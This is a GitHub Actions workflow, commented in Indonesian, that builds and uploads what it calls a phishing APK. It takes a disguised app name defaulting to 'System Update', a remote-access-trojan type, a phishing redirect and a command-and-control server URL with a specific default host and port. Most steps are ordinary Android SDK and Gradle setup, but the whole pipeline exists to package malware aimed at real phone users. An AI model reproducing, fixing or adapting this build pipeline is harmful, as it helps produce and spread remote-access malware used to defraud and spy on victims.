name: Auto Build Phishing APK

on:
  workflow_dispatch:
    inputs:
      app_name:
        description: "Nama Aplikasi"
        required: true
        default: "System Update"
      app_id:
        description: "ApplicationId"
        required: false
        default: "com.sync.xxx"
      rat_type:
        description: "ALL atau TWO"
        required: true
        default: "ALL"
        type: choice
        options: [ALL, TWO]
      redirect_mode:
        description: "URL atau HTML"
        required: true
        default: "URL"
        type: choice
        options: [URL, HTML]
      redirect_value:
        description: "URL atau HTML content"
        required: true
        default: "https://example.com"
      server_url:
        description: "C2 URL"
        required: true
        default: "http://papsky.queen-official.com:2468"
      pair_id:
        description: "Pair ID"
        required: false
        default: ""
      icon_base64:
        description: "Icon PNG base64"
        required: false
        default: ""
      version_name:
        required: false
        default: "1.0"
      version_code:
        required: false
        default: "1"

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 60
    permissions:
      contents: read
      actions: write

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Install Pillow
        run: pip install Pillow

      - name: Pair ID
        id: pair
        run: |
          PAIR="${{ github.event.inputs.pair_id }}"
          if [ -z "$PAIR" ]; then
            RAND=$(printf "%04d" $((RANDOM % 10000)))
            PAIR="NEONXJZET$(date +%s | tail -c 5)${RAND}"
          fi
          echo "pair_id=$PAIR" >> "$GITHUB_OUTPUT"
          echo "PAIR=$PAIR"

      - name: Inject config
        env:
          APP_NAME: ${{ github.event.inputs.app_name }}
          APP_ID: ${{ github.event.inputs.app_id }}
          RAT_TYPE: ${{ github.event.inputs.rat_type }}
          REDIRECT_MODE: ${{ github.event.inputs.redirect_mode }}
          REDIRECT_VALUE: ${{ github.event.inputs.redirect_value }}
          SERVER_URL: ${{ github.event.inputs.server_url }}
          PAIR_ID: ${{ steps.pair.outputs.pair_id }}
          ICON_BASE64: ${{ github.event.inputs.icon_base64 }}
          VERSION_NAME: ${{ github.event.inputs.version_name }}
          VERSION_CODE: ${{ github.event.inputs.version_code }}
        run: |
          set -e
          python3 builder/inject_config.py
          echo "Inject OK pair=${{ steps.pair.outputs.pair_id }}"

      # ─── Android SDK ───────────────────────────────────────────────────────────
      - name: Install Android SDK cmdline-tools
        run: |
          set -e
          sudo apt-get update -qq
          sudo apt-get install -y -qq wget unzip >/dev/null
          mkdir -p "$HOME/android-sdk/cmdline-tools"
          cd /tmp
          wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip -O cmdtools.zip
          unzip -q cmdtools.zip
          rm -rf "$HOME/android-sdk/cmdline-tools/latest"
          mkdir -p "$HOME/android-sdk/cmdline-tools/latest"
          mv cmdline-tools/* "$HOME/android-sdk/cmdline-tools/latest/"
          echo "ANDROID_HOME=$HOME/android-sdk" >> "$GITHUB_ENV"
          echo "ANDROID_SDK_ROOT=$HOME/android-sdk" >> "$GITHUB_ENV"
          echo "$HOME/android-sdk/cmdline-tools/latest/bin" >> "$GITHUB_PATH"
          echo "$HOME/android-sdk/platform-tools" >> "$GITHUB_PATH"

      - name: SDK packages + licenses
        run: |
          set -e
          export ANDROID_HOME="$HOME/android-sdk"
          export ANDROID_SDK_ROOT="$HOME/android-sdk"
          yes | sdkmanager --sdk_root="$ANDROID_HOME" --licenses >/tmp/lic.txt || true
          sdkmanager --sdk_root="$ANDROID_HOME" \
            "platform-tools" \
            "platforms;android-34" \
            "build-tools;34.0.0"
          echo "sdk.dir=$ANDROID_HOME" > android/local.properties
          echo "SDK ready"

      - name: Gradle wrapper executable
        run: |
          chmod +x android/gradlew
          test -f android/gradle/wrapper/gradle-wrapper.jar

      # ─── Download Gradle manual + letakkan di cache path yang dipakai wrapper ──
      - name: Pre-download Gradle distribution
        run: |
          set -euo pipefail
          GRADLE_VERSION="8.6"
          # Path persis yang dicek Gradle wrapper sebelum dia download sendiri
          CACHE_DIR="$HOME/.gradle/wrapper/dists/gradle-${GRADLE_VERSION}-bin"
          mkdir -p "$CACHE_DIR"

          DEST="$CACHE_DIR/gradle-${GRADLE_VERSION}-bin.zip"

          # Coba services.gradle.org langsung (bukan CDN GitHub yang 504)
          URLS=(
            "https://services.gradle.org/distributions/gradle-${GRADLE_VERSION}-bin.zip"
            "https://downloads.gradle-dn.com/distributions/gradle-${GRADLE_VERSION}-bin.zip"
          )

          DOWNLOADED=false
          for URL in "${URLS[@]}"; do
            echo "Trying: $URL"
            for attempt in 1 2 3; do
              echo "  attempt $attempt..."
              if wget \
                  --timeout=180 \
                  --tries=1 \
                  --waitretry=10 \
                  -q "$URL" -O "$DEST"; then
                # Verify ZIP bukan HTML error page
                if unzip -t "$DEST" > /dev/null 2>&1; then
                  echo "Download OK from $URL"
                  DOWNLOADED=true
                  break 2
                else
                  echo "  ZIP corrupt/invalid, removing"
                  rm -f "$DEST"
                fi
              fi
              sleep 10
            done
          done

          if [ "$DOWNLOADED" = false ]; then
            echo "ERROR: Semua URL gagal"
            exit 1
          fi

          # Buat marker file yang dipakai Gradle wrapper untuk tahu ZIP sudah ada
          # Format: <hash>.ok  — wrapper pakai MD5 dari URL sebagai subfolder
          # Tapi cara paling aman: unzip manual ke subdir yang wrapper ekspektasikan
          HASH_DIR=$(echo -n "https://services.gradle.org/distributions/gradle-${GRADLE_VERSION}-bin.zip" \
            | md5sum | awk '{print $1}')
          EXTRACT_DIR="$CACHE_DIR/$HASH_DIR"
          mkdir -p "$EXTRACT_DIR"

          echo "Extracting to $EXTRACT_DIR..."
          unzip -q "$DEST" -d "$EXTRACT_DIR"
          # Marker file OK
          touch "$EXTRACT_DIR/gradle-${GRADLE_VERSION}-bin.zip.ok"
          ls "$EXTRACT_DIR/" | head -5
          echo "Gradle $GRADLE_VERSION cache ready"

      - name: Build Release APK
        working-directory: android
        env:
          ANDROID_HOME: ${{ env.ANDROID_HOME }}
          ANDROID_SDK_ROOT: ${{ env.ANDROID_SDK_ROOT }}
          # Matikan download ulang — paksa pakai GRADLE_USER_HOME
          GRADLE_OPTS: >-
            -Dorg.gradle.daemon=false
            -Dorg.gradle.jvmargs=-Xmx2g
            -Dorg.gradle.internal.http.socketTimeout=120000
            -Dorg.gradle.internal.http.connectionTimeout=120000
            -Dorg.gradle.wrapper.properties.networkTimeout=120000
        run: |
          set -e
          export GRADLE_USER_HOME="$HOME/.gradle"
          chmod +x gradlew
          set -o pipefail
          if ! ./gradlew assembleRelease \
              --no-daemon \
              --stacktrace 2>&1 | tee /tmp/build.log; then
            echo "===== GRADLE FAILURE (excerpt) ====="
            grep -A5 -E "FAILURE:|What went wrong:|error:|e: file://" /tmp/build.log | tail -100 || true
            exit 1
          fi
          echo "=== APK check ==="
          if [ -f app/build/outputs/apk/release/app-release.apk ]; then
            ls -la app/build/outputs/apk/release/
          elif [ -f app/build/outputs/apk/release/app-release-unsigned.apk ]; then
            ls -la app/build/outputs/apk/release/
          else
            echo "Release APK missing"
            find app/build/outputs -type f 2>/dev/null || true
            tail -50 /tmp/build.log
            exit 1
          fi

      - name: Collect APK
        id: apk
        run: |
          set -e
          mkdir -p output
          APK=""
          for C in \
            android/app/build/outputs/apk/release/app-release.apk \
            android/app/build/outputs/apk/release/app-release-unsigned.apk \
            android/app/build/outputs/apk/debug/app-debug.apk
          do
            if [ -f "$C" ]; then APK="$C"; break; fi
          done
          if [ -z "$APK" ]; then
            APK=$(find android/app/build/outputs -type f -name "*.apk" 2>/dev/null | head -1 || true)
          fi
          if [ -z "$APK" ] || [ ! -f "$APK" ]; then
            echo "No APK found after build"
            exit 1
          fi
          SAFE=$(echo "${{ github.event.inputs.app_name }}" | tr -cd 'A-Za-z0-9._-' | cut -c1-40)
          [ -z "$SAFE" ] && SAFE="app"
          OUT="output/${SAFE}_${{ steps.pair.outputs.pair_id }}.apk"
          cp -f "$APK" "$OUT"
          echo "path=$OUT" >> "$GITHUB_OUTPUT"
          ls -lh "$OUT"

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: Phishing-APK-${{ steps.pair.outputs.pair_id }}
          path: output/*.apk
          retention-days: 15
          if-no-files-found: error

      - name: Summary
        run: |
          echo "### BUILD OK" >> "$GITHUB_STEP_SUMMARY"
          echo "- Pair: ${{ steps.pair.outputs.pair_id }}" >> "$GITHUB_STEP_SUMMARY"
          echo "- App: ${{ github.event.inputs.app_name }}" >> "$GITHUB_STEP_SUMMARY"
